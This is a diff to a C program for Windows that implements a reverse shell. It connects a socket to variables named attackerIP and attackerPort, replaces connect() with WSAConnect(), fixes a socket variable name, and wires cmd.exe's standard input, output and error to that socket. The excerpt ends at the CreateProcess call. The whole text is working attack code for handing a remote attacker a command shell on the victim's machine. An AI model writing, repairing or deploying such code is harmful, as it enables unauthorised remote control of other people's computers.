@@ -23,7 +23,8 @@ int main(void)
   serverAddr.sin_family = AF_INET;
   serverAddr.sin_port = htons(attackerPort);
   serverAddr.sin_addr.s_addr = inet_addr(attackerIP);
-  if (connect(ms, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+  WSAConnect(ms, (SOCKADDR*)&serverAddr, sizeof(serverAddr), NULL, NULL, NULL, NULL);
+  if (WSAGetLastError() != 0)
   {
     printf("Connection failed with error: %d\n", WSAGetLastError());
     closesocket(ms);
@@ -34,7 +35,7 @@ int main(void)
   memset(&startupInfo, 0, sizeof(startupInfo));
   startupInfo.cb = sizeof(startupInfo);
   startupInfo.dwFlags = STARTF_USESTDHANDLES;
-  startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE)mainSocket;
+  startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE)ms;
   CreateProcess(
       NULL,
       (LPSTR) "C:\\Windows\\System32\\cmd.exe",
